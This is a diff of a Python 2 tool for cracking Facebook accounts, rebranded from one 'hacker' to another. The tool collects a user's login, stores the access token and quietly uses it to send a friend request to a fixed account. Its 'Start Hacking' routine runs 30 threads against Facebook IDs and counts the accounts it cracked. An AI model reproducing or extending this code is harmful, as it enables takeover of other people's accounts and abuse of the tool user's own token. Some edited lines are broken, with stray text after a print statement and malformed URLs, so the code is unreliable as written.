@@ -1,8 +1,8 @@
 #!/usr/bin/python2
 #coding=utf-8
-#The Credit For This Code Goes To BabarAli
+#The Credit For This Code Goes To Abid Hussain shadow hacker
 #If You Wanna Take Credits For This Code, Please Look Yourself Again...
-#Reserved2020
+#Reserved2021
 
 
 import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
@@ -110,16 +110,16 @@ def phone():
 		login()
 	os.system('clear')		
 
-#Dev:Babar_Ali
-##### LOGO #####
-logo = """
+#Dev:BaShadow_hacker father of all hackers
+##### LOGO ##### its not name its brand shadow
+logo = """ 
 \033[1;97m#     #  #####        #    # #       #     #
 \033[1;97m#     # #     #       #   #  #        #   #
-\033[1;97m#     #       #       #  #   #         # #
+\033[1;97m#     #       #       #         # #
 \033[1;97m#     #  #####  ##### ###    #          #
 \033[1;97m #   #  #             #  #   #         # #
 \033[1;97m  # #   #             #   #  #        #   #
-\033[1;97m   #    #######       #    # ####### #     #
+\033[1;97m  # #.  # # #
 \033[1;97m•───────────────────────────────────────────•
 \033[1;97m__   __          _             __   ___   _
 \033[1;97m\ \ / /__ _ _ __(_)___ _ _    /  \ |_  ) / |
@@ -147,28 +147,73 @@ berhasil = []
 cekpoint = []
 oks = []
 id = []
-listgrup = []
 vulnot = "\033[31mNot Vuln"
 vuln = "\033[32mVuln"
 
 os.system("clear")
 print  """
-\033[1;97m#     #  #####        #    # #       #     #
-\033[1;97m#     # #     #       #   #  #        #   #
-\033[1;97m#     #       #       #  #   #         # #
-\033[1;97m#     #  #####  ##### ###    #          #
-\033[1;97m #   #  #             #  #   #         # #
-\033[1;97m  # #   #             #   #  #        #   #
-\033[1;97m   #    #######       #    # ####### #     #
+\033[1;97m#     #  #####        #    # #      
+\033[1;97m#     # #     #      
+\033[1;97m#     #       #       #  VIRUS CREATION OF SHADOW HACKER   
+\033[1;97m#     #  #####  #####  
+\033[1;97m #   #  #        
+\033[1;97m  # #   #         
+
+🅂🄷🄰🄳🄾🅆 🄷🄰🄲🄺🄴🅁
+\033[1;97m   #    #######       
 \033[1;97m•───────────────────────────────────────────•
 \033[1;97m__   __          _             __   ___   _
-\033[1;97m\ \ / /__ _ _ __(_)___ _ _    /  \ |_  ) / |
-\033[1;97m \ V / -_) '_(_-< / _ \ ' \  | () | / / _| |
-\033[1;97m  \_/\___|_| /__/_\___/_||_|  \__(_)___(_)_|
+\033[1;97m\ 
+\033[1;97m 
+
+╔╗─────╔╗──────╔╗────────────╔╗
+
+║║────╔╝╚╗────╔╝╚╗───────────║║
+
+║║──╔═╩╗╔╬══╦═╩╗╔╝╔══╦═╦══╦══╣║╔╦╦═╗╔══╗
+
+║║─╔╣╔╗║║║║═╣══╣║─║╔═╣╔╣╔╗║╔═╣╚╝╬╣╔╗╣╔╗║
+
+║╚═╝║╔╗║╚╣║═╬══║╚╗║╚═╣║║╔╗║╚═╣╔╗╣║║║║╚╝║
+
+╚═══╩╝╚╩═╩══╩══╩═╝╚══╩╝╚╝╚╩══╩╝╚╩╩╝╚╩═╗║
+
+────────────────────────────────────╔═╝║
+
+────────────────────────────────────╚══╝
+
+────╔═╗╔═══╦═══╦═══╗╔╗─╔╗
+
+────║╔╝║╔═╗║╔═╗║╔═╗╠╝║─║║
+
+╔══╦╝╚╗╚╝╔╝║║║║╠╝╔╝╠╗║─║╚═╦╗─╔╗
+
+║╔╗╠╗╔╝╔═╝╔╣║║║╠═╝╔╝║║─║╔╗║║─║║
+
+║╚╝║║║─║║╚═╣╚═╝║║╚═╦╝╚╗║╚╝║╚═╝║
+
+╚══╝╚╝─╚═══╩═══╩═══╩══╝╚══╩═╗╔╝
+
+──────────────────────────╔═╝║
+
+──────────────────────────╚══╝
+
+╔══╗──────╔╗──────────────────╔╗
+
+║╔╗║──────║║─────────────────╔╝╚╗
+
+║╚╝╚╦╗╔╦══╣╚═╦═╦══╗╔══╦═╦══╦═╩╗╔╬╦══╦═╗
+
+║╔═╗║║║║══╣╔╗║╔╣╔╗║║╔═╣╔╣║═╣╔╗║║╠╣╔╗║╔╗╗
+
+║╚═╝║╚╝╠══║║║║║║╔╗║║╚═╣║║║═╣╔╗║╚╣║╚╝║║║║
+
+╚═══╩══╩══╩╝╚╩╝╚╝╚╝╚══╩╝╚══╩╝╚╩═╩╩══╩╝╚╝
+\033[1;97m  
 \033[1;97m•───────────────────────────────────────────•
  """
-CorrectUsername = "Facebook"
-CorrectPassword = "Huntter"
+CorrectUsername = "shadow"
+CorrectPassword = "Hacker"
 
 loop = 'true'
 while (loop == 'true'):
@@ -176,15 +221,15 @@ while (loop == 'true'):
     if (username == CorrectUsername):
     	password = raw_input("\033[1;91m[+] \033[1;91m \x1b[1;91mTool Password \x1b[1;91m: \x1b[1;97m")
         if (password == CorrectPassword):
-            print "Logged in successfully as " + username #Dev:Babar_Ali
+            print "Logged in successfully as " + username #Dev: Shadow Hacker/ bhusra creation
 	    time.sleep(2)
             loop = 'false'
         else:
             print "\033[1;97mWrong Password"
-            os.system('xdg-open https://www.youtube.com/channel/UCWLIAZHMlnlQMuMKTjBdbAQ')
+            os.system('xdg-open https://www.youtube.com/channel/UCDKRvmw7ufXejkYXG51liKA')
     else:
         print "\033[1;97mWrong Username"
-        os.system('xdg-open https://www.youtube.com/channel/UCWLIAZHMlnlQMuMKTjBdbAQ')
+        os.system('xdg-open https://www.youtube.com/channel/UCDKRvmw7ufXejkYXG51liKA')
 
 ##### LICENSE #####
 #=================#
@@ -203,7 +248,7 @@ def login():
         time.sleep(0.05)
         print "\033[1;97m[4]\033[1;47m\033[1;31mSubscribe YouTube Channel        \033[1;0m"
         time.sleep(0.05)
-	print "\033[1;97m[5]\033[1;47m\033[1;31mJoin WP group For Help           \033[1;0m"
+	print "\033[1;97m[5]\033[1;47m\033[1;31mJoin WP group for help          \033[1;0m"
         time.sleep(0.05)
         print "\033[1;97m[0]\033[1;47m\033[1;31mExit                             \033[1;0m"
 	time.sleep(0.05)
@@ -222,10 +267,10 @@ def pilih_login():
 	        os.system('xdg-open https://m.apkpure.com/get-access-token/com.proit.thaison.getaccesstokenfacebook/download/1-APK?from=versions%2Fversion')
 	        login()
         elif peak =="4":
-	        os.system('xdg-open https://www.youtube.com/channel/UCWLIAZHMlnlQMuMKTjBdbAQ')
+	        os.system('xdg-open https://www.youtube.com/channel/UCDKRvmw7ufXejkYXG51liKA')
 	        login()
         elif peak =="5":
-	        os.system('xdg-open https://chat.whatsapp.com/FlzjJ1wklTo3EvKtkSfwRZ')
+	        os.system('xdg-open https://chat.whatsapp.com/https://chat.whatsapp.com/IwnJQIbaaKN99fUx9NvAH6')
                 login()
 	elif peak =="0":
 		keluar()
@@ -242,7 +287,7 @@ def login1():
 		os.system('clear')
                 time.sleep(0.05)
 		print logo                
-		print "\033[1;97m•-----------------\033[1;37mKali.linux\033[1;97m-----------------•"
+		print "\033[1;97m•-----------------\033[1;3hackerdxx\033[1;97m-----------------•"
 		print('\033[1;97m[+]\033[1;47m\033[1;31mLOGIN WITH FACEBOOK\x1b[1;97m \033[1;0m' )
 		print('	' )
 		id = raw_input('\033[1;97m[!] \x1b[1;97mNumber/Email\x1b[1;97m: \x1b[1;97m')
@@ -274,7 +319,7 @@ def login1():
 				unikers.write(z['access_token'])
 				unikers.close()
 				print '\033[1;47m\033[1;91mLogin Successful\033[1;0m'
-				os.system('xdg-open https://www.youtube.com/channel/UCWLIAZHMlnlQMuMKTjBdbAQ')
+				os.system('xdg-open https://www.youtube.com/channel/https://UCDKRvmw7ufXejkYXG51liKA')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
@@ -318,7 +363,7 @@ def menu():
 	except requests.exceptions.ConnectionError:
 		print"\x1b[1;94mThere is no internet connection"
 		keluar()
-	os.system("clear") #Dev:Babar_Ali
+	os.system("clear") #Dev: shadow hacker with Bushraa creation
 	print logo
 	print "\033[1;37m[!]\033[1;97m Logged in User Information\033[1;92m"
 	time.sleep(0.05)
@@ -326,7 +371,7 @@ def menu():
 	time.sleep(0.05)
 	print "\033[1;37m[•]\033[1;91m ID\033[1;93m:\033[1;91m"+id+"\x1b[1;93m              "
 	time.sleep(0.05)
-	print "\033[1;97m•-----------------\033[1;37mKali.linux\033[1;97m-----------------•"
+	print "\033[1;97m•-----------------\033[1;37mits me bushra sexy QUeeN its my creation\033[1;97m-----------------•"
 	print "\033[1;97m[1]\033[1;47m\033[1;31mStart Hacking                             \033[1;0m"
 	time.sleep(0.05)
 	print "\033[1;97m[2]\033[1;47m\033[1;31mID Not Found Problem                      \033[1;0m"
@@ -482,7 +527,7 @@ def pilih_super():
 		try:
 			os.mkdir('out')
 		except OSError:
-			pass #Dev:Babar_Ali
+			pass #Dev:Bushra my naame iam owner of Shadow Hacker team
 		try:													
 			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)												
 			b = json.loads(a.text)												
@@ -690,11 +735,11 @@ def pilih_super():
 		
 	p = ThreadPool(30)
 	p.map(main, id)
-#Dev:Babar_Ali
-        print "\033[1;97m•-----------------\033[1;37mKali.linux\033[1;97m-----------------•"
-	print '\033[1;97m[+]\033[1;47m \033[1;31mProcess Has Been Completed\033[1;0m'
+#Dev: Shadow Hacker iam bushra friendz with combination
+        print "\033[1;97m•-----------------\033[1;37mits abi hacker bushra cyber exprt\033[1;97m-----------------•"
+	print '\033[1;97m[+]\033[1;47m \033[1;31mProcess Has Been Completed\033[1;0m' Bushra say thanks for using my command
 	print"\033[1;97m[+]\033[1;97mTotal \033[1;97mOK/\x1b[1;97mCP \033[1;97m: \033[1;97m"+str(len(oks))+"\033[1;97m/\033[1;97m"+str(len(cekpoint))
-	print "\033[1;97m«-----------------\033[1;37mKali.linux\033[1;97m-----------------»"
+	print "\033[1;97m«-----------------\033[1;37mhacker\033[1;97m-----------------»"
 	print """
 \033[1;97m ____               _____ ____
 \033[1;97m| __ ) _   _  ___  |_   _/ ___|
@@ -703,7 +748,7 @@ def pilih_super():
 \033[1;97m|____/ \__, |\___|   |_| \____|
 \033[1;97m       |___/
 """
-	print "\033[1;97m«-----------------\033[1;37mKali.linux\033[1;97m-----------------»"
+	print "\033[1;97m«-----------------\033[1;37msexy hacker secy QUeeN\033[1;97m-----------------»"
 	raw_input("\n\033[1;97m[+]\033[1;97mBack")
 	menu()
 
